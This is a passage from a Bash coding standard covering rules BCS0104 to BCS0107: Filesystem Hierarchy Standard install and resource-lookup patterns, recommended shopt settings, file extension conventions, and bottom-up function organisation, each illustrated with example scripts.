- **Make readonly as a group** after all assignments
- **Use metadata** for resource location, logging, error messages, version display
- **Handle edge cases**: root directory, sourced scripts
- **Performance**: Consider loading realpath as builtin for maximum speed

**Key principle:** Metadata provides the foundation for reliable script operation. Declaring it consistently at the top of every script enables predictable behavior regardless of how the script is invoked or where it's located.


---


**Rule: BCS0104**

## Filesystem Hierarchy Standard (FHS) Preference

**When designing scripts that install files or search for resources, follow the Filesystem Hierarchy Standard (FHS) where practical. FHS compliance enables predictable file locations, supports both system and user installations, and integrates smoothly with package managers.**

**Rationale:**

- **Predictability**: Users and package managers expect files in standard locations (`/usr/local/bin/`, `/usr/share/`, etc.)
- **Multi-Environment Support**: Scripts work correctly in development, local install, system install, and user-specific install scenarios
- **Package Manager Compatibility**: FHS-compliant layouts work seamlessly with apt, yum, pacman, etc.
- **No Hardcoded Paths**: Using FHS search patterns eliminates brittle absolute paths
- **Portability**: Scripts work across different Linux distributions without modification
- **Separation of Concerns**: FHS separates executables, data, configuration, and documentation logically

**Common FHS locations:**
- `/usr/local/bin/` - User-installed executables (system-wide, not managed by package manager)
- `/usr/local/share/` - Architecture-independent data files
- `/usr/local/lib/` - Libraries and loadable modules
- `/usr/local/etc/` - Configuration files
- `/usr/bin/` - System executables (managed by package manager)
- `/usr/share/` - System-wide architecture-independent data
- `$HOME/.local/bin/` - User-specific executables (in user's PATH)
- `$HOME/.local/share/` - User-specific data files
- `${XDG_CONFIG_HOME:-$HOME/.config}/` - User-specific configuration

**When FHS is useful:**
- Installation scripts that need to place files in standard locations
- Scripts that search for data files in multiple standard locations
- Scripts that support both system-wide and user-specific installation
- Projects distributed to multiple systems expecting standard paths

**Example pattern - searching for data files:**
```bash
find_data_file() {
  local -- script_dir=$1
  local -- filename=$2
  local -a search_paths=(
    "$script_dir"/"$filename"  # Same directory (development)
    /usr/local/share/myapp/"$filename" # Local install
    /usr/share/myapp/"$filename" # System install
    "${XDG_DATA_HOME:-"$HOME"/.local/share}"/myapp/"$filename"  # User install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; } ||:
  done

  return 1
}
```

**Complete installation example (Makefile pattern):**

```bash
#!/bin/bash
# install.sh - FHS-compliant installation script
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Installation paths (customizable via PREFIX)
declare -- PREFIX=${PREFIX:-/usr/local}
declare -- BIN_DIR="$PREFIX"/bin
declare -- SHARE_DIR="$PREFIX"/share/myapp
declare -- LIB_DIR="$PREFIX"/lib/myapp
declare -- ETC_DIR="$PREFIX"/etc/myapp
declare -- MAN_DIR="$PREFIX"/share/man/man1
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR MAN_DIR

install_files() {
  # Create directories
  install -d "$BIN_DIR"
  install -d "$SHARE_DIR"
  install -d "$LIB_DIR"
  install -d "$ETC_DIR"
  install -d "$MAN_DIR"

  # Install executable
  install -m 755 "$SCRIPT_DIR"/myapp "$BIN_DIR"/myapp

  # Install data files
  install -m 644 "$SCRIPT_DIR"/data/template.txt "$SHARE_DIR"/template.txt

  # Install libraries
  install -m 644 "$SCRIPT_DIR"/lib/common.sh "$LIB_DIR"/common.sh

  # Install configuration (preserve existing)
  if [[ ! -f "$ETC_DIR"/myapp.conf ]]; then
    install -m 644 "$SCRIPT_DIR"/myapp.conf.example "$ETC_DIR"/myapp.conf
  fi

  # Install man page
  install -m 644 "$SCRIPT_DIR"/docs/myapp.1 "$MAN_DIR"/myapp.1

  info "Installation complete to $PREFIX"
  info "Executable: $BIN_DIR/myapp"
}

uninstall_files() {
  # Remove installed files
  rm -f "$BIN_DIR"/myapp
  rm -f "$SHARE_DIR"/template.txt
  rm -f "$LIB_DIR"/common.sh
  rm -f "$MAN_DIR"/myapp.1

  # Remove directories if empty
  rmdir --ignore-fail-on-non-empty "$SHARE_DIR"
  rmdir --ignore-fail-on-non-empty "$LIB_DIR"
  rmdir --ignore-fail-on-non-empty "$ETC_DIR"

  info 'Uninstallation complete'
}

main() {
  case "${1:-install}" in
    install)   install_files ;;
    uninstall) uninstall_files ;;
    *)         die 2 "Usage: $SCRIPT_NAME {install|uninstall}" ;;
  esac
}

main "$@"

#fin
```

**FHS-aware resource loading pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Find data file using FHS search pattern
find_data_file() {
  local -- filename=$1
  local -a search_paths=(
    # Development: same directory as script
    "$SCRIPT_DIR"/"$filename"

    # Local install: /usr/local/share
    /usr/local/share/myapp/"$filename"

    # System install: /usr/share
    /usr/share/myapp/"$filename"

    # User install: XDG Base Directory
    "${XDG_DATA_HOME:-"$HOME"/.local/share}"/myapp/"$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    if [[ -f "$path" ]]; then
      echo "$path"
      return 0
    fi
  done

  die 2 "Data file not found ${filename@Q}"
}

# Find configuration file with XDG support
find_config_file() {
  local -- filename=$1
  local -a search_paths=(
    # User-specific config (highest priority)
    "${XDG_CONFIG_HOME:-"$HOME"/.config}"/myapp/"$filename"

    # System-wide local config
    /usr/local/etc/myapp/"$filename"

    # System-wide config
    /etc/myapp/"$filename"

    # Development/fallback
    "$SCRIPT_DIR"/"$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ ! -f "$path" ]] || { echo "$path"; return 0; }
  done

  # Return empty if not found (config is optional)
  return 1
}

# Load library from FHS locations
load_library() {
  local -- lib_name=$1
  local -a search_paths=(
    # Development
    "$SCRIPT_DIR"/lib/"$lib_name"

    # Local install
    /usr/local/lib/myapp/"$lib_name"

    # System install
    /usr/lib/myapp/"$lib_name"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { source "$path"; return 0; } ||:
  done

  die 2 "Library not found ${lib_name@Q}"
}

main() {
  # Load required library
  load_library common.sh

  # Find data file
  local -- template
  template=$(find_data_file template.txt)
  info "Using template ${template@Q}"

  # Find config file (optional)
  local -- config
  if config=$(find_config_file myapp.conf); then
    info "Loading config ${config@Q}"
    source "$config"
  else
    info 'No config file found, using defaults'
  fi

  # Main logic here
  #...
}

main "$@"
#fin
```

**PREFIX customization (make install pattern):**

```bash
# Makefile example
PREFIX ?= /usr/local
BINDIR = $(PREFIX)/bin
SHAREDIR = $(PREFIX)/share/myapp
MANDIR = $(PREFIX)/share/man/man1

install:
	install -d $(BINDIR)
	install -d $(SHAREDIR)
	install -d $(MANDIR)
	install -m 755 myapp $(BINDIR)/myapp
	install -m 644 data/template.txt $(SHAREDIR)/template.txt
	install -m 644 docs/myapp.1 $(MANDIR)/myapp.1

uninstall:
	rm -f $(BINDIR)/myapp
	rm -f $(SHAREDIR)/template.txt
	rm -f $(MANDIR)/myapp.1

# Usage:
# make install                      # Installs to /usr/local
# make PREFIX=/usr install          # Installs to /usr
# make PREFIX=$HOME/.local install  # User install
```

**XDG Base Directory Specification:**

For user-specific files, follow XDG Base Directory spec:

```bash
# XDG environment variables with fallbacks
declare -- XDG_DATA_HOME=${XDG_DATA_HOME:-"$HOME"/.local/share}
declare -- XDG_CONFIG_HOME=${XDG_CONFIG_HOME:-"$HOME"/.config}
declare -- XDG_CACHE_HOME=${XDG_CACHE_HOME:-"$HOME"/.cache}
declare -- XDG_STATE_HOME=${XDG_STATE_HOME:-"$HOME"/.local/state}

# User-specific paths
declare -- USER_DATA_DIR="$XDG_DATA_HOME"/myapp
declare -- USER_CONFIG_DIR="$XDG_CONFIG_HOME"/myapp
declare -- USER_CACHE_DIR="$XDG_CACHE_HOME"/myapp
declare -- USER_STATE_DIR="$XDG_STATE_HOME"/myapp

# Create user directories if needed
install -d "$USER_DATA_DIR"
install -d "$USER_CONFIG_DIR"
install -d "$USER_CACHE_DIR"
install -d "$USER_STATE_DIR"
```

**Production-Ready Templates (Copy-Paste Ready):**

These templates are extracted from the `bcs` script itself and demonstrate production-tested FHS compliance patterns. Adapt by replacing `yatti/bash-coding-standard` with your organization/project name.

**Template 1: Find File in FHS Locations**

This template searches for a specific file across all standard FHS locations, supporting development mode, custom PREFIX installs, system-local, and system-wide installations.

```bash
# Find specific file (e.g., BASH-CODING-STANDARD.md, config.yml, data.json)
# Usage: bcs_file=$(find_bcs_file "$SCRIPT_DIR") || die 'File not found'
find_bcs_file() {
  local -- script_dir=$1
  local -- install_share="${script_dir%/bin}"/share/yatti/bash-coding-standard
  local -a search_paths=(
    "$script_dir"                                 # Development: same directory
    "$install_share"                              # Custom PREFIX: relative to bin/
    /usr/local/share/yatti/bash-coding-standard   # System-local install
    /usr/share/yatti/bash-coding-standard         # System-wide install
  )
  local -- path
  for path in "${search_paths[@]}"; do
    if [[ -f "$path"/BASH-CODING-STANDARD.md ]]; then
      echo "$path"/BASH-CODING-STANDARD.md
      return 0
    fi
  done

  return 1
}
declare -fx find_bcs_file

# Usage example:
BCS_FILE=$(find_bcs_file "$SCRIPT_DIR") || die 1 'BASH-CODING-STANDARD.md not found'
```

**Key features of this template:**
- **`install_share` calculation**: Dynamically computes share directory from bin directory using `${script_dir%/bin}/share/...`
- **Four search locations**: Development, custom PREFIX, /usr/local, /usr
- **Early return on found**: Uses `&& { echo ...; return 0; }` for immediate success
- **Export**: Uses `declare -fx` for use in subshells if needed

**Adaptation guide:**
```bash
# Replace 'yatti/bash-coding-standard' with your org/project:
install_share="${script_dir%/bin}"/share/myorg/myproject
/usr/local/share/myorg/myproject
/usr/share/myorg/myproject

# Replace 'BASH-CODING-STANDARD.md' with your target file:
[[ -f "$path"/config.yml ]] && { echo "$path"/config.yml; return 0; }

# Rename function to match purpose:
find_config_file() { ... }
find_template_file() { ... }
```

**Template 2: Find Data Directory**

This template finds the data directory itself (rather than a specific file), useful for scripts that need to enumerate or access multiple files within the data directory.

```bash
# Find data directory in FHS locations
# Usage: data_dir=$(find_data_dir) || die 'Data directory not found'
find_data_dir() {
  local -- install_share="${BCS_DIR%/bin}/share/yatti/bash-coding-standard/data"
  local -a search_paths=(
    "$BCS_DIR"/data                                   # Development mode
    "$install_share"                                  # Custom PREFIX install
    /usr/local/share/yatti/bash-coding-standard/data  # System-local install
    /usr/share/yatti/bash-coding-standard/data        # System-wide install
  )
  local -- path
  for path in "${search_paths[@]}"; do
    [[ -d "$path" ]] && { echo "$path"; return 0; } ||:
  done

  return 1
}
declare -fx find_data_dir

# Usage example:
DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
```

**Differences from Template 1:**
- **Directory check**: Uses `[[ -d "$path" ]]` instead of `[[ -f ... ]]`
- **Returns directory**: Echoes directory path, not file path
- **Enables enumeration**: Caller can then use `find "$DATA_DIR" ...` or `for file in "$DATA_DIR"/*.md`

**Usage patterns:**
```bash
# Pattern 1: Find and enumerate files
DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
readarray -t md_files < <(find "$DATA_DIR" -name '*.md' | sort)

# Pattern 2: Check for specific files in data directory
DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
[[ -f "$DATA_DIR"/templates/basic.sh ]] || die 1 'Template not found'

# Pattern 3: Iterate over data files
DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
for file in "$DATA_DIR"/*.json; do
  process_json "$file"
done
```

**Combined Template: Universal FHS Resource Finder**

For maximum flexibility, combine both patterns into a generic resource finder:

```bash
# Generic FHS resource finder
# Usage: find_resource file "config.yml" || die 'Config not found'
# Usage: find_resource dir "data" || die 'Data directory not found'
find_resource() {
  local -- type=$1     # 'file' or 'dir'
  local -- name=$2     # Resource name
  local -- install_base="${SCRIPT_DIR%/bin}"/share/myorg/myproject
  local -a search_paths=(
    "$SCRIPT_DIR"                        # Development
    "$install_base"                      # Custom PREFIX
    /usr/local/share/myorg/myproject     # Local install
    /usr/share/myorg/myproject           # System install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    local -- resource="$path/$name"
    case "$type" in
      file) [[ -f "$resource" ]] && { echo "$resource"; return 0; } ||: ;;
      dir)  [[ -d "$resource" ]] && { echo "$resource"; return 0; } ||: ;;
      *)    die 2 "Invalid resource type ${type@Q}" ;;
    esac
  done

  return 1
}
declare -fx find_resource

# Usage:
CONFIG=$(find_resource file config.yml) || die 'Config not found'
DATA_DIR=$(find_resource dir data) || die 'Data directory not found'
TEMPLATE=$(find_resource file templates/basic.sh) || die 'Template not found'
```

**Real-world example from this repository:**

The actual `bash-coding-standard` (bcs) script uses these exact patterns (lines 137-171 in bcs). Here's the simplified version showing the file search:

```bash
find_bcs_file() {
  local -a search_paths=(
    # Development: same directory as script
    "$SCRIPT_DIR"/BASH-CODING-STANDARD.md

    # Local install: /usr/local/share
    /usr/local/share/yatti/bash-coding-standard/BASH-CODING-STANDARD.md

    # System install: /usr/share
    /usr/share/yatti/bash-coding-standard/BASH-CODING-STANDARD.md
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; } ||:
  done

  die 2 'BASH-CODING-STANDARD.md not found in any standard location'
}

BCS_FILE=$(find_bcs_file)
```

This approach allows the script to work in:
- Development mode (running from source directory)
- After `make install` (to /usr/local)
- After `make PREFIX=/usr install` (system-wide)
- When installed by package manager (debian, rpm, etc.)

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - hardcoded absolute path
data_file=/home/user/projects/myapp/data/template.txt

# ✓ Correct - FHS search pattern
data_file=$(find_data_file template.txt)

# ✗ Wrong - assuming specific install location
source /usr/local/lib/myapp/common.sh

# ✓ Correct - search multiple FHS locations
load_library common.sh

# ✗ Wrong - using relative paths from CWD
source ../lib/common.sh  # Breaks when run from different directory

# ✓ Correct - paths relative to script location
source "$SCRIPT_DIR"/../lib/common.sh

# ✗ Wrong - installing to non-standard location
install myapp /opt/random/location/bin/

# ✓ Correct - use PREFIX-based FHS paths
install myapp "$PREFIX"/bin/

# ✗ Wrong - not supporting PREFIX customization
BIN_DIR=/usr/local/bin  # Hardcoded

# ✓ Correct - respect PREFIX environment variable
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin

# ✗ Wrong - mixing executables and data in same directory
install myapp /opt/myapp/
install template.txt /opt/myapp/

# ✓ Correct - separate by FHS hierarchy
install myapp "$PREFIX"/bin/
install template.txt "$PREFIX"/share/myapp/

# ✗ Wrong - overwriting user configuration on upgrade
install myapp.conf "$PREFIX"/etc/myapp/myapp.conf

# ✓ Correct - preserve existing config
[[ -f "$PREFIX"/etc/myapp/myapp.conf ]] || \
  install myapp.conf.example "$PREFIX"/etc/myapp/myapp.conf
```

**Edge cases:**

**1. PREFIX with trailing slash:**

```bash
# Handle PREFIX with or without trailing slash
PREFIX=${PREFIX:-/usr/local}
PREFIX=${PREFIX%/}  # Remove trailing slash if present
BIN_DIR="$PREFIX"/bin
```

**2. User install without sudo:**

```bash
# Detect if user has write permissions
if [[ ! -w "$PREFIX" ]]; then
  warn "No write permission to ${PREFIX@Q}"
  info "Try: PREFIX=\$HOME/.local make install"
  die 5 'Permission denied'
fi
```

**3. Library path for runtime:**

```bash
# Some systems need LD_LIBRARY_PATH for custom locations
if [[ -d "$PREFIX"/lib/myapp ]]; then
  export LD_LIBRARY_PATH="$PREFIX"/lib/myapp"${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
fi
```

**4. Symlink vs real path:**

```bash
# If script is symlinked to /usr/local/bin, SCRIPT_DIR resolves to actual location
# This is correct - we want the real installation directory, not the symlink location
SCRIPT_PATH=$(realpath -- "$0")  # Resolves symlinks
SCRIPT_DIR=${SCRIPT_PATH%/*}

# Now SCRIPT_DIR points to actual install location, not /usr/local/bin
```

**When NOT to use FHS:**

- **Single-user scripts**: Scripts only used by one user don't need FHS
- **Project-specific tools**: Build scripts, test runners that stay in project directory
- **Container applications**: Docker containers often use app-specific paths like `/app`
- **Embedded systems**: Limited systems may use custom layouts

**Summary:**

- **Follow FHS** for scripts that install system-wide or distribute to users
- **Use PREFIX** to support custom installation locations
- **Search multiple locations** for resources (development, local, system, user)
- **Separate file types**: bin/ for executables, share/ for data, etc/ for config, lib/ for libraries
- **Support XDG** for user-specific files (`XDG_CONFIG_HOME`, `XDG_DATA_HOME`)
- **Preserve user config** on upgrades (don't overwrite existing files)
- **Make PREFIX customizable** via environment variable

**Key principle:** FHS compliance makes scripts portable, predictable, and compatible with package managers. Design scripts to work in development mode and multiple install scenarios without modification.


---


**Rule: BCS0105**

## shopt

**Recommended settings for most scripts:**

```bash
# RECOMMENDED - apply to all scripts
shopt -s inherit_errexit  # Critical: makes set -e work in subshells,
                          # command substitutions
shopt -s shift_verbose    # Catches shift errors when no arguments remain
shopt -s extglob          # Enables extended glob patterns like !(*.txt)

# CHOOSE ONE based on use case:
shopt -s nullglob   # For arrays/loops: unmatched globs → empty (no error)
                # OR
shopt -s failglob   # For strict scripts: unmatched globs → error

# OPTIONAL based on needs:
shopt -s globstar   # Enable ** for recursive matching (slow on deep trees)
```

**Detailed rationale for each setting:**

**`inherit_errexit` (CRITICAL):**
- **Without it**: `set -e` does NOT apply inside command substitutions or subshells
- **With it**: Errors in `$(...)` and `(...)` properly propagate
- **Example of the problem:**
```bash
set -e  # Without inherit_errexit
result=$(false)  # This does NOT exit the script!
echo "Still running"  # This executes

# With inherit_errexit
shopt -s inherit_errexit
result=$(false)  # Script exits here as expected
```

**`shift_verbose`:**
- **Without it**: `shift` silently fails when no arguments remain, continues execution
- **With it**: Prints error message when shift fails (respects `set -e`)
- **Example:**
```bash
shopt -s shift_verbose
shift  # If no arguments: "bash: shift: shift count must be <= $#"
```

**`extglob`:**
- **Enables advanced pattern matching** that regular globs cannot do
- **Patterns enabled**: `?(pattern)`, `*(pattern)`, `+(pattern)`, `@(pattern)`, `!(pattern)`
- **Example use cases:**
```bash
shopt -s extglob

# Delete everything EXCEPT .txt files
rm !(*.txt)

# Match files with multiple extensions
cp *.@(jpg|png|gif) /destination/

# Match one or more digits
[[ $input == +([0-9]) ]] && echo 'Number'
```

**`nullglob` vs `failglob` (Choose one):**

**`nullglob`:**
- **Best for**: Scripts that process file lists in loops/arrays
- **Behavior**: Unmatched glob expands to empty string (no error)
- **Example:**
```bash
shopt -s nullglob
for file in *.txt; do  # If no .txt files, loop body never executes
  echo "$file"
done

files=(*.log)  # If no .log files: files=() (empty array)
```

**`failglob`:**
- **Best for**: Strict scripts where unmatched glob indicates an error
- **Behavior**: Unmatched glob causes error (respects `set -e`)
- **Example:**
```bash
shopt -s failglob
cat *.conf  # If no .conf files: "bash: no match: *.conf" (exits with set -e)
```

**Without either (default bash behavior):**
```bash
# ✗ Dangerous default behavior
for file in *.txt; do  # If no .txt files, $file = literal string "*.txt"
  rm "$file"  # Tries to delete file named "*.txt"!
done
```

**`globstar` (OPTIONAL):**
- **Enables `**` for recursive directory matching** (like `find`)
- **Warning**: Can be slow on deep directory trees
- **Example:**
```bash
shopt -s globstar

# Recursively find all .sh files
for script in **/*.sh; do
  shellcheck "$script"
done

# Equivalent to: find . -name '*.sh' -type f
```

**Typical script configuration:**
```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

**When NOT to use these settings:**
- **Interactive scripts**: May want more lenient behavior
- **Legacy compatibility**: Older bash versions may not support all options
- **Performance-critical loops**: `globstar` can be slow on large trees


---


**Rule: BCS0106**

## File Extensions
- Executables should have `.sh` extension or no extension
- Libraries must have `.sh` extension and should not be executable
- Libraries that can also be executed as scripts can have either `.sh` or no extension
- If the executable will be available globally via PATH, always use no extension


---


**Rule: BCS0107**

## Function Organization

**Always organize functions bottom-up: lowest-level primitives first (messaging, utilities), then composition layers, ending with `main()` as the highest-level orchestrator. This pattern makes scripts readable, maintainable, and eliminates forward reference issues.**

**Rationale:**

- **No Forward References**: Bash reads top-to-bottom; defining functions in dependency order ensures all called functions exist before use
- **Readability**: Readers understand primitives first, then see how they're composed into complex operations
- **Debugging Efficiency**: When debugging, you can read from top down and understand dependencies immediately
- **Maintainability**: Clear dependency hierarchy makes it obvious where to add new functions
- **Testability**: Low-level functions can be tested independently before testing higher-level compositions
- **Cognitive Load**: Understanding small pieces first, then compositions reduces mental overhead

**Standard 7-layer organization pattern:**

```bash
#!/bin/bash
set -euo pipefail

# 1. Messaging functions (lowest level - used by everything)
_msg() { ... }
success() { >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# 2. Documentation functions (no dependencies)
show_help() { ... }

# 3. Helper/utility functions (used by validation and business logic)
yn() { ... }
noarg() { ... }

# 4. Validation functions (check prerequisites, dependencies)
check_root() { ... }
check_prerequisites() { ... }
check_builtin_support() { ... }

# 5. Business logic functions (domain-specific operations)
build_standalone() { ... }
build_builtin() { ... }
install_standalone() { ... }
install_builtin() { ... }
install_completions() { ... }
update_man_database() { ... }

# 6. Orchestration/flow functions
show_completion_message() { ... }
uninstall_files() { ... }

# 7. Main function (highest level - orchestrates everything)
main() {
  check_root
  check_prerequisites

  if ((UNINSTALL)); then
    uninstall_files
    return 0
  fi

  build_standalone
  ((INSTALL_BUILTIN)) && build_builtin

  install_standalone
  install_completions
  ((INSTALL_BUILTIN)) && install_builtin

  update_man_database
  show_completion_message
}

main "$@"
#fin
```

**Key principle of bottom-up organization:**

Each function can safely call functions defined ABOVE it (earlier in the file). Dependencies flow downward: higher functions call lower functions, never upward.

```
Top of file
     ↓
[Layer 1: Messaging] ← Can call nothing (primitives)
     ↓
[Layer 2: Documentation] ← Can call Layer 1
     ↓
[Layer 3: Utilities] ← Can call Layers 1-2
     ↓
[Layer 4: Validation] ← Can call Layers 1-3
     ↓
[Layer 5: Business Logic] ← Can call Layers 1-4
     ↓
[Layer 6: Orchestration] ← Can call Layers 1-5
     ↓
[Layer 7: main()] ← Can call all layers
     ↓
main "$@" invocation
#fin
```

**Detailed layer descriptions:**

**Layer 1: Messaging functions (lowest primitives)**
- `_msg()`, `info()`, `warn()`, `error()`, `die()`, `success()`, `debug()`, `vecho()`
- **Purpose**: Output messages to user
- **Dependencies**: None (pure I/O)
- **Used by**: Everything

**Layer 2: Documentation functions**
- `show_help()`, `show_version()`, `show_help()`
- **Purpose**: Display help text and usage information
- **Dependencies**: May use messaging functions
- **Used by**: Argument parsing, main()

**Layer 3: Helper/utility functions**
- `yn()`, `noarg()`, `trim()`, `s()`, `decp()`
- **Purpose**: Generic utilities usable anywhere
- **Dependencies**: May use messaging
- **Used by**: Validation, business logic

**Layer 4: Validation functions**
- `check_root()`, `check_prerequisites()`, `validate_input()`, `check_dependencies()`
- **Purpose**: Verify preconditions and input
- **Dependencies**: Utilities, messaging
- **Used by**: main(), business logic

**Layer 5: Business logic functions**
- Domain-specific operations: `build_project()`, `process_file()`, `deploy_app()`
- **Purpose**: Core functionality of the script
- **Dependencies**: All lower layers
- **Used by**: Orchestration, main()

**Layer 6: Orchestration functions**
- `run_build_phase()`, `run_deploy_phase()`, `cleanup()`
- **Purpose**: Coordinate multiple business logic functions
- **Dependencies**: Business logic, validation
- **Used by**: main()

**Layer 7: main() function**
- **Purpose**: Top-level script flow
- **Dependencies**: Can call any function
- **Used by**: Script invocation line

**Complete example showing full organization:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global variables
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- BUILD_DIR=/tmp/build

# ============================================================================
# Layer 1: Messaging functions
# ============================================================================
declare -i VERBOSE=1
#declare -i DEBUG=0 PROMPT=1

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
#    debug)   prefix+=" ${CYAN}DEBUG${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
#debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Layer 2: Documentation functions
# ============================================================================

show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

show_help() {
  cat << EOF
$SCRIPT_NAME $VERSION - Build/Deploy application

Build and deploy the application for all users on $HOSTNAME.

Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -n, --dry-run   Dry-run mode (no changes)
  -v, --verbose   Enable verbose output
  -q, --quiet     Disable verbose output
  -V, --version   Show version
  -h, --help      Show this help

Examples:
  $SCRIPT_NAME -vn
  $SCRIPT_NAME -V
EOF
}

# ============================================================================
# Layer 3: Helper/utility functions
# ============================================================================

yn() {
  #((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}

noarg() { (($# < 2)) && die 2 "Option ${1@Q} requires an argument"; }

# ============================================================================
# Layer 4: Validation functions
# ============================================================================

check_prerequisites() {
  info 'Checking prerequisites...'

  # Check required commands
  local -- cmd
  for cmd in git make tar; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      die 1 "Required command not found: $cmd"
    fi
  done

  # Check build directory writable
  if [[ ! -w "${BUILD_DIR%/*}" ]]; then
    die 5 "Cannot write to build directory ${BUILD_DIR@Q}"
  fi

  success 'Prerequisites check passed'
}

validate_config() {
  info 'Validating configuration...'

  # Check config file exists
  [[ -f 'config.conf' ]] || die 2 'Configuration file not found: config.conf'

  # Validate config contents
  source 'config.conf'

  [[ -n "${APP_NAME:-}" ]] || die 22 'APP_NAME not set in config'
  [[ -n "${APP_VERSION:-}" ]] || die 22 'APP_VERSION not set in config'

  debug "App: $APP_NAME $APP_VERSION"
  success 'Configuration validated'
}

# ============================================================================
# Layer 5: Business logic functions
# ============================================================================

clean_build_dir() {
  info "Cleaning build directory ${BUILD_DIR@Q}"

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would remove build directory'
    return 0
  fi

  if [[ -d "$BUILD_DIR" ]]; then
    rm -rf "$BUILD_DIR"
    debug "Removed: $BUILD_DIR"
  fi

  install -d "$BUILD_DIR"
  success "Build directory ready: $BUILD_DIR"
}

compile_sources() {
  info 'Compiling sources...'

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would compile sources'
    return 0
  fi

  # Compile logic here
  make -C src all BUILD_DIR="$BUILD_DIR"

  success 'Sources compiled'
}

run_tests() {
  info 'Running tests...'

  if ((DRY_RUN)); then
    info '[DRY-RUN] Would run tests'
    return 0
  fi

  # Test logic here
  make -C tests all

  success 'Tests passed'
}

create_package() {
  info 'Creating package...'
  local -- package_file="$BUILD_DIR"/app.tar.gz

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would create package: $package_file"
    return 0
  fi

  tar -czf "$package_file" -C "$BUILD_DIR" .
  success "Package created: $package_file"
}

# ============================================================================
# Layer 6: Orchestration functions
# ============================================================================

run_build_phase() {
  info 'Starting build phase...'

  clean_build_dir
  compile_sources
  run_tests

  success 'Build phase complete'
}

run_package_phase() {
  info 'Starting package phase...'

  create_package

  success 'Package phase complete'
}

# ============================================================================
# Layer 7: Main function (highest level)
# ============================================================================

main() {
  # Parse arguments (simplified for example)
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -q|--quiet)   VERBOSE=0 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -V|--version) show_version; return 0 ;;
    -h|--help)    show_help; return 0 ;;
    -[vqnVh]*) #shellcheck disable=SC2046 # Split combined short options: -Dv -> -D -v
                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)           die 22 "Invalid option ${1@Q}" ;;
    *)            die 2 "Unexpected argument ${1@Q}" ;;
  esac; shift; done

  # Set readonly after argument parsing
  readonly -- VERBOSE DRY_RUN

  info "Starting $SCRIPT_NAME $VERSION"
  ((DRY_RUN)) && info 'DRY-RUN MODE ENABLED' ||:

  # Validate environment
  check_prerequisites
  validate_config

  # Execute phases in order
  run_build_phase
  run_package_phase

  success "$SCRIPT_NAME completed successfully"
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - main() at the top (forward references required)
main() {
  build_project  # build_project not defined yet!
  deploy_app     # deploy_app not defined yet!
}

build_project() { ... }
deploy_app() { ... }

# ✓ Correct - main() at bottom
build_project() { ... }
deploy_app() { ... }

main() {
  build_project
  deploy_app
}

# ✗ Wrong - business logic before utilities it calls
process_file() {
  validate_input "$1"  # validate_input not defined yet!
  # ...
}

validate_input() { ... }

# ✓ Correct - utilities before business logic
validate_input() { ... }

process_file() {
